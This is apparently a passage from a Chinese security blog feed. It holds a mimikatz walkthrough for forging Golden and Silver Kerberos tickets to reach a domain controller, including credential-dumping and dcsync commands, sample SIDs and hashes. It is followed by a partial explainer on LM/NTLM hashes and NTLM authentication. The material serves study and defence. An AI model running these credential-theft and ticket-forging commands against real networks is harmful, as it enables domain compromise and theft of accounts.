/ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="1566543225966.png" alt=""></p><h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><img src="1566542805439.png" alt=""></p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure><p><img src="1566543260644.png" alt=""></p><p><strong>TIPS:</strong></p><p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p><p><img src="1049983-20171227215506456-245748150.png" alt="img"></p><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li><li>可以伪造任意用户，即使其不存在。</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li></ul><h4 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h4><ul><li><strong>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组</strong>。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li><li><strong>禁用KRBTGT帐户，并保存当前的密码以及以前的密码</strong>。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li></ul><h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p><p><strong>正确的认证流程:</strong></p><p><img src="20160118045254154911118.png" alt="Alt text"></p><p><strong>使用了Silver Ticke的认证流程:</strong></p><p><img src="20160118045256924591213.png" alt="Alt text"></p><h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul><li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li><li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li><li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li><li>攻击者需要服务帐户密码哈希值</li><li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li><li>任何事件日志都在目标服务器上。</li></ul><p><strong>制作银票的条件：</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域中的Server服务器账户的NTLM-Hash</span><br><span class="line"><span class="number">4.</span>伪造的用户名，可以是任意用户名.</span><br><span class="line"><span class="number">5.</span>目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure><p><strong>白银票据的服务列表</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务名称                    同时需要的服务</span><br><span class="line">WMI                        HOST、RPCSS</span><br><span class="line">PowerShell Remoting        HOST、HTTP</span><br><span class="line">WinRM                    HOST、HTTP</span><br><span class="line">Scheduled Tasks            HOST</span><br><span class="line">Windows File Share        CIFS</span><br><span class="line">LDAP                    LDAP</span><br><span class="line">Windows Remote<span class="built_in"> Server </span>   RPCSS、LDAP、CIFS</span><br></pre></td></tr></table></figure><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="1-获取hash-sid等信息"><a href="#1-获取hash-sid等信息" class="headerlink" title="1.获取hash sid等信息"></a>1.获取hash sid等信息</h5><p>  首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mimikatz</span><span class="selector-class">.exe</span> "<span class="selector-tag">privilege</span><span class="selector-pseudo">::debug"</span> "<span class="selector-tag">sekurlsa</span><span class="selector-pseudo">::logonpasswords"</span> "<span class="selector-tag">exit</span>" &gt; 1<span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="1566649973247.png" alt=""></p><h5 id="2-伪造白银票据"><a href="#2-伪造白银票据" class="headerlink" title="2.伪造白银票据"></a>2.伪造白银票据</h5><p>这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。</p><p>参数说明：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/domain</span>：当前域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，和金票一样取前面一部分</span><br><span class="line"><span class="string">/target</span>：目标主机，这里是OWA2010SP3.0day.org</span><br><span class="line"><span class="string">/service</span>：服务名称，这里需要访问共享文件，所以是cifs</span><br><span class="line"><span class="string">/rc4</span>：目标主机的HASH值</span><br><span class="line"><span class="string">/user</span>：伪造的用户名</span><br><span class="line"><span class="string">/ptt</span>：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用<span class="string">/ticket</span>导出之后再使用kerberos:<span class="function">:ptt</span>来导入</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /target:OWA2010SP3<span class="number">.0</span>day.org /service:cifs /rc4:<span class="number">125445</span>ed1d553393cce9585e64e3fa07 /user:silver /ptt</span><br></pre></td></tr></table></figure><p><img src="1566654188946.png" alt=""></p><p>这时通过klist查看当前会话的kerberos票据可以看到生成的票据。</p><p><img src="1566654225879.png" alt=""></p><p>使用<code>dir \\OWA2010SP3.0day.org\c$</code>访问DC的共享文件夹。</p><p><img src="1566654265383.png" alt=""></p><h4 id="各种服务中的示例"><a href="#各种服务中的示例" class="headerlink" title="各种服务中的示例"></a>各种服务中的示例</h4><table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table><h5 id="Windows共享（CIFS）管理访问的银票"><a href="#Windows共享（CIFS）管理访问的银票" class="headerlink" title="Windows共享（CIFS）管理访问的银票"></a>Windows共享（CIFS）管理访问的银票</h5><p>为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</p><p>注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</p><p>c $共享，我们能够将文件拷贝到共享文件中。</p><h5 id="具有管理员权限的Windows计算机（HOST）白银票据"><a href="#具有管理员权限的Windows计算机（HOST）白银票据" class="headerlink" title="具有管理员权限的Windows计算机（HOST）白银票据"></a>具有管理员权限的Windows计算机（HOST）白银票据</h5><p>创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</p><h5 id="Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"><a href="#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行" class="headerlink" title="Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行"></a>Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</h5><p>为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</p><p>注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的LDAP"><a href="#白银票据证连接到具有管理员权限Windows计算机上的LDAP" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的LDAP"></a>白银票据证连接到具有管理员权限Windows计算机上的LDAP</h5><p>为“ldap”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</p><p>利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</p><p><strong>注：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync</span><br></pre></td></tr></table></figure><p>​    向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</p><h5 id="白银票据证连接到具有管理员权限Windows计算机上的WMI"><a href="#白银票据证连接到具有管理员权限Windows计算机上的WMI" class="headerlink" title="白银票据证连接到具有管理员权限Windows计算机上的WMI"></a>白银票据证连接到具有管理员权限Windows计算机上的WMI</h5><p> 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。</p><p>注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process <span class="literal">-ComputerName</span> <span class="variable">$</span> Computer <span class="literal">-Credential</span> <span class="variable">$</span> Creds <span class="literal">-name</span> create <span class="literal">-argumentlist</span>“<span class="variable">$</span> RunCommand”</span><br></pre></td></tr></table></figure><h5 id="访问域控上“cifs”服务实列"><a href="#访问域控上“cifs”服务实列" class="headerlink" title="访问域控上“cifs”服务实列"></a>访问域控上“cifs”服务实列</h5><p>首先需要获得如下信息：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">domain</span><br><span class="line"><span class="string">/sid</span></span><br><span class="line"><span class="string">/target</span>:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"><span class="string">/service</span>：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"><span class="string">/rc4</span>：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"><span class="string">/user</span>：要伪造的用户名，此处可用silver测试</span><br></pre></td></tr></table></figure><p>使用mimikatz执行如下命令导入Silver Ticket</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test.local /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-4155807533</span><span class="string">-921486164</span><span class="string">-2767329826</span> /target:WIN<span class="string">-8</span>VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"</span><br></pre></td></tr></table></figure><p>此时可以成功访问域控上的文件共享</p><h4 id="关于黄金票据和白银票据的一些区别"><a href="#关于黄金票据和白银票据的一些区别" class="headerlink" title="关于黄金票据和白银票据的一些区别:"></a>关于黄金票据和白银票据的一些区别:</h4><h5 id="1-访问权限不同"><a href="#1-访问权限不同" class="headerlink" title="1.访问权限不同"></a>1.访问权限不同</h5><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><h5 id="3-认证流程不同"><a href="#3-认证流程不同" class="headerlink" title="3.认证流程不同"></a>3.认证流程不同</h5><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p>[<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]</a>(<a href="https://wooyun.js.org/drops/域渗透——Pass" target="_blank" rel="noopener">https://wooyun.js.org/drops/域渗透——Pass</a> The Ticket.html)</p><p><a href="http://www.test666.me/archives/264/" target="_blank" rel="noopener">http://www.test666.me/archives/264/</a></p><p><a href="https://uknowsec.cn/posts/notes/域渗透-Ticket.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</a></p><p><a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/</a></p><p><a href="http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/" target="_blank" rel="noopener">http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/</a></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;a href=&quot;#浅析黄金票据与白银票据&quot; class=&quot;headerlink&quot; title=&quot;浅析黄金票据与白银票据&quot;&gt;&lt;/a&gt;浅析黄金票据与白银票据&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="内网与域渗透学习" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E4%B8%8E%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="票据" scheme="https://shu1l.github.io/tags/%E7%A5%A8%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之NTML hash</title>
    <link href="https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/"/>
    <id>https://shu1l.github.io/2020/06/05/yu-shen-tou-zhi-ntml-hash/</id>
    <published>2020-06-05T14:25:49.000Z</published>
    <updated>2020-11-25T08:56:36.959Z</updated>
    
    <content type="html"><![CDATA[<p><strong>转载自:</strong><a href="https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/" target="_blank" rel="noopener">https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/</a></p><h2 id="域渗透之NTML-Hash"><a href="#域渗透之NTML-Hash" class="headerlink" title="域渗透之NTML-Hash"></a>域渗透之NTML-Hash</h2><h3 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h3><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了<strong>WindowsNT挑战/响应验证机制</strong>，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p><p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串<code>KGS!@#$%</code>。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p><h4 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h4><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p><p><strong>补充：</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows Vista`和`Windows<span class="built_in"> Server </span>2008`以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式`LM hash:NT hash`，可以将LM Hash填0(LM hash可以为任意值)，即`00000000000000000000000000000000:NT hash</span><br></pre></td></tr></table></figure><h4 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h4><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p><p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p><blockquote><p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p></blockquote><p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p><p>本地认证流程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="function"><span class="title">lsass</span>.exe -&gt;</span> (认证)</span><br></pre></td></tr></table></figure><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><p>在系统中，hash格式是类似这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::</span><br></pre></td></tr></table></figure><h4 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h4><p>用户密码为<code>test123</code></p><p>转换成十六进制的格式为<code>74657374313233</code></p><p>转换成Unicode格式为<code>7400650073007400310032003300</code></p><p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p><p><strong>注：</strong></p><p>MD4加密可使用工具HashCalc，如下图</p><p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p><p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p><blockquote><p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p></blockquote><p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p><p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p><p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p><p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p><blockquote><p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p></blockquote><p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::</span><br></pre></td></tr></table></figure><h3 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h3><h5 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h5><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于工作组和域环境下<code>登录场景的身份认证</code>。</p><h4 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h4><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p><p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p><blockquote><p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p></blockquote><p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p><ul><li><strong>协商</strong>：主要用于确认双方协议版本</li><li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li><li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li></ul><p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p><p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p><p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\<span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>\$share /u:administrator password</span><br></pre></td></tr></table></figure><p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p><p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p><p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p><blockquote><p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，NTML认证机制参与认证过程。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p></blockquote><p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p><h4 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h4><p>工作组中，涉及Clinet、Server，流程如下：</p><ul><li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li><li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li><li>服务器生成一个16字节的随机数，称为<strong><em>质询\</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>，并将<em>challenge</em>发送给客户端</li><li>客户端使用缓存的<strong><em>用户密码的哈希值\</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li><li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li></ul><h4 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h4><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p><blockquote><ol><li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85).aspx" target="_blank" rel="noopener"><em>hash</em></a> of the password and discards the actual password.</li><li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85).aspx" target="_blank" rel="noopener"><em>plaintext</em></a>).</li><li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85).aspx" target="_blank" rel="noopener"><em>nonce</em></a>, and sends it to the client.</li><li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li><li>The server sends the following three items to the domain controller:<ul><li>User name</li><li>Challenge sent to the client</li><li>Response received from the client</li></ul></li><li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li><li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  